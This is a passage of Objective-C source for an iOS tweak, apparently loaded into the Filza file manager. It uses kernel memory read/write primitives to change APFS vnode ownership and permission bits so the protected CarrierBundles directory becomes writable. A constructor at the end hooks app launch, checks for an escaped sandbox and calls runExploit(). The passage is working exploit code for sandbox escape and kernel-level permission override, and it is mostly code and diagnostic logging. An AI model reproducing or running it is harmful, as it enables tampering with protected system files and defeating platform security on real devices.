                if ((verifyStat.st_mode & 0700) != 0700) {
                    NSLog(@"[Tweak] Root directory owner lacks rwx after kernel walk, trying direct vnode write");
                    uint64_t rv = get_vnode_for_path_kernel(cbPath);
                    if (rv != (uint64_t)-1 && rv != 0) {
                        if (apfs_own_vnode(rv, 501, 501) == 0) {
                            sync();
                            NSLog(@"[Tweak] Direct vnode write on root succeeded");
                        } else {
                            NSLog(@"[Tweak] Direct vnode write on root failed");
                        }
                    }
                }
            } else {
                NSLog(@"[Tweak] Cannot stat CarrierBundles after kernel walk (errno=%d)", errno);
            }
        }

        // Step 2: Force-populate the vnode name cache by opening the directory
        // and reading all entries.  After Step 1 the root has owner rwx so
        // opendir/readdir works.  Each readdir() call populates the kernel's
        // name cache for the directory's children.
        {
            DIR *populateDir = opendir(cbPath);
            if (populateDir) {
                struct dirent *de;
                while ((de = readdir(populateDir)) != NULL) {
                    if (strcmp(de->d_name, ".") == 0 || strcmp(de->d_name, "..") == 0) continue;
                    char childPath[PATH_MAX];
                    snprintf(childPath, sizeof(childPath), "%s/%s", cbPath, de->d_name);
                    struct stat childStat;
                    if (stat(childPath, &childStat) == 0 && S_ISDIR(childStat.st_mode)) {
                        DIR *subDir = opendir(childPath);
                        if (subDir) {
                            struct dirent *subDe;
                            while ((subDe = readdir(subDir)) != NULL) { /* populates cache */ }
                            closedir(subDir);
                        } else {
                            NSLog(@"[Tweak] Could not opendir subdir %s (errno=%d)", childPath, errno);
                        }
                    }
                }
                closedir(populateDir);
                NSLog(@"[Tweak] CarrierBundles name cache populated via readdir");
            } else {
                NSLog(@"[Tweak] Could not opendir %s after kernel takeover (errno=%d)", cbPath, errno);
                // The kernel walk should have set owner rwx.  If opendir still
                // fails, something is wrong with the root directory.  Try to
                // force-mode it again.
                NSLog(@"[Tweak] Forcing root directory mode via kernel write");
                uint64_t rv = get_vnode_for_path_kernel(cbPath);
                if (rv != (uint64_t)-1 && rv != 0) {
                    if (apfs_own_vnode(rv, 501, 501) == 0) {
                        sync();
                        NSLog(@"[Tweak] Root directory mode force-written via apfs_own_vnode");
                    } else {
                        NSLog(@"[Tweak] apfs_own_vnode failed on root directory");
                    }
                }
            }
        }

        // Step 3: Kernel walk again — now the name cache has all children,
        // so every file/dir inside CarrierBundles gets uid=501, gid=501, owner RW.
        kn = apfs_own_tree_kernel(cbPath, 501, 501);
        NSLog(@"[Tweak] CarrierBundles second kernel walk: %ld entries processed", kn);

        // Step 4: Multi-pass userspace tree walk (chown + chmod every entry).
        // After kernel steps 1-3, all entries should have owner RW, so this is a
        // verification pass that also catches any stragglers.
        long total = 0;
        for (int pass = 0; pass < 10; pass++) {
            long n = apfs_own_tree(cbPath, 501, 501);
            total += n;
            if (n == 0) break;
            NSLog(@"[Tweak] CarrierBundles pass %d: chown'd %ld entries (cumulative %ld)", pass, n, total);
        }
        NSLog(@"[Tweak] CarrierBundles apfs_own_tree multi-pass: %ld total entries", total);

        // Step 5: Final kernel-level fallback — catches any entries the
        // userspace walk couldn't modify due to per-entry DAC restrictions.
        kn = apfs_own_tree_kernel(cbPath, 501, 501);
        NSLog(@"[Tweak] CarrierBundles final kernel walk: %ld entries processed", kn);
    }

    // Verify write access: try to create a test file inside CarrierBundles
    char testPath[PATH_MAX];
    snprintf(testPath, sizeof(testPath), "%s/.tweak_write_test", cbPath);
    int tf = open(testPath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (tf >= 0) {
        write(tf, "ok", 2);
        close(tf);
        unlink(testPath);
        NSLog(@"[Tweak] *** CarrierBundles write access VERIFIED ***");
    } else {
        int write_errno = errno;
        NSLog(@"[Tweak] *** CarrierBundles write access FAILED (errno=%d: %s) *** "
              "uid=%d euid=%d gid=%d egid=%d",
              write_errno, strerror(write_errno), getuid(), geteuid(), getgid(), getegid());

        // Diagnostic: check if the issue is sandbox (EACCES) or read-only fs (EROFS)
        if (write_errno == EACCES) {
            NSLog(@"[Tweak] errno=EACCES -> sandbox or DAC is still blocking writes");
        } else if (write_errno == EROFS) {
            NSLog(@"[Tweak] errno=EROFS -> filesystem is read-only (sealed snapshot?)");
        } else if (write_errno == EPERM) {
            NSLog(@"[Tweak] errno=EPERM -> operation not permitted (AMFI?)");
        }

        // Diagnostic: verify kernel state of root directory
        {
            struct stat diagStat;
            if (stat(cbPath, &diagStat) == 0) {
                NSLog(@"[Tweak] Root dir stat: uid=%u gid=%u mode=0%o",
                      diagStat.st_uid, diagStat.st_gid, diagStat.st_mode & 0xFFFF);
                if (diagStat.st_uid != 501 || (diagStat.st_mode & 0200) == 0) {
                    NSLog(@"[Tweak] Root dir NOT owned by mobile or lacks owner write bit!");
                }
            } else {
                NSLog(@"[Tweak] Cannot stat CarrierBundles (errno=%d)", errno);
            }

            // Kernel-level read of fsnode to verify actual on-disk state
            uint64_t diag_vnode = get_vnode_for_path_kernel(cbPath);
            if (diag_vnode != (uint64_t)-1 && diag_vnode != 0) {
                uint64_t diag_fs = kread64(diag_vnode + off_vnode_v_data);
                if (diag_fs) {
                    uint32_t k_uid = kread32(diag_fs + offsetof(struct apfs_fsnode, uid));
                    uint16_t k_mode = kread16(diag_fs + offsetof(struct apfs_fsnode, mode));
                    uint32_t k_bsd = kread32(diag_fs + offsetof(struct apfs_fsnode, bsd_flags));
                    uint32_t k_ino_ext = kread32(diag_fs + offsetof(struct apfs_fsnode, ino_flags_ext));
                    NSLog(@"[Tweak] Kernel fsnode: uid=%u mode=0%o bsd_flags=0x%x ino_flags_ext=0x%x",
                          k_uid, k_mode, k_bsd, k_ino_ext);
                    if ((k_bsd & 0x01) || k_ino_ext != 0) {
                        NSLog(@"[Tweak] FS node has protection flags! bsd_flags=0x%x ino_flags_ext=0x%x",
                              k_bsd, k_ino_ext);
                    }
                    if (k_uid != 501 || (k_mode & 0200) == 0) {
                        NSLog(@"[Tweak] FS node not correctly set! Forcing direct kernel write...");
                        apfs_own_vnode(diag_vnode, 501, 501);
                        sync();
                        // Re-check
                        k_uid = kread32(diag_fs + offsetof(struct apfs_fsnode, uid));
                        k_mode = kread16(diag_fs + offsetof(struct apfs_fsnode, mode));
                        k_bsd = kread32(diag_fs + offsetof(struct apfs_fsnode, bsd_flags));
                        k_ino_ext = kread32(diag_fs + offsetof(struct apfs_fsnode, ino_flags_ext));
                        NSLog(@"[Tweak] After force-write: uid=%u mode=0%o bsd_flags=0x%x ino_flags_ext=0x%x",
                              k_uid, k_mode, k_bsd, k_ino_ext);
                    }
                }
            }
        }

        // Final fallback: kernel-level path resolution + kernel walk
        {
            uint64_t rv = get_vnode_for_path_kernel(cbPath);
            if (rv != (uint64_t)-1 && rv != 0) {
                // Populate name cache then kernel walk
                DIR *pd = opendir(cbPath);
                if (pd) { struct dirent *de; while ((de = readdir(pd)) != NULL) {} closedir(pd); }
                long kn = apfs_own_tree_kernel(cbPath, 501, 501);
                NSLog(@"[Tweak] Final fallback kernel walk: %ld entries", kn);

                // Try writing again with O_RDWR | O_CREAT
                tf = open(testPath, O_RDWR | O_CREAT | O_TRUNC, 0644);
                if (tf >= 0) {
                    close(tf); unlink(testPath);
                    NSLog(@"[Tweak] *** CarrierBundles write access VERIFIED after kernel fallback ***");
                } else {
                    int final_errno = errno;
                    NSLog(@"[Tweak] *** CarrierBundles STILL not writable after all fallbacks "
                          "(errno=%d: %s) ***", final_errno, strerror(final_errno));
                    NSLog(@"[Tweak] This usually means the rootfs is on a sealed snapshot.");
                    NSLog(@"[Tweak] On iOS 17+ with snapshots, writes go to the data partition,");
                    NSLog(@"[Tweak] not the actual CarrierBundles directory.");
                }
            } else {
                NSLog(@"[Tweak] Final fallback: get_vnode_for_path_kernel also failed");
            }
        }
    }

    // For any root-owned paths that still fail DAC, use apfs_own(path, 501, 501)
    // to flip on-disk ownership to mobile before opening.

    // Auto-chown runs lazily via the contentsOfDirectoryAtPath: hook: the
    // first time Filza lists anything inside /var/containers/Bundle/Application/
    // <UUID>/<Name>.app, apfs_own_tree fires on that .app in the background.
}

#pragma mark - Entry Point

__attribute__((constructor)) void TweakInit(void) {
    installHooks();

    // Check if sandbox is already escaped
    int fd = open("/var/mobile/.sbx_check", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) {
        close(fd); unlink("/var/mobile/.sbx_check");
        NSLog(@"[Tweak] Sandbox already escaped");
        return;
    }

    // Run exploit AFTER app finishes launching (UIKit must be ready for offsets_init
    // which uses UIDevice.currentDevice.systemVersion)
    [[NSNotificationCenter defaultCenter] addObserverForName:UIApplicationDidFinishLaunchingNotification
        object:nil queue:nil usingBlock:^(NSNotification *note) {
        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            runExploit();
        });
    }];
}
